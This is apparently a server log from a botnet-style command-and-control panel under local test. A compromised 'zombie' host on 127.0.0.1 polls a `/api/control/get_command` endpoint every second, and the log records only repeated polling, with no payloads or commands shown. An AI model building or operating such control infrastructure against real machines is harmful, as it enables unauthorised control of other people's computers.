2025-06-24 23:24:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:24:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:24:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:24:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:24:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:24:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
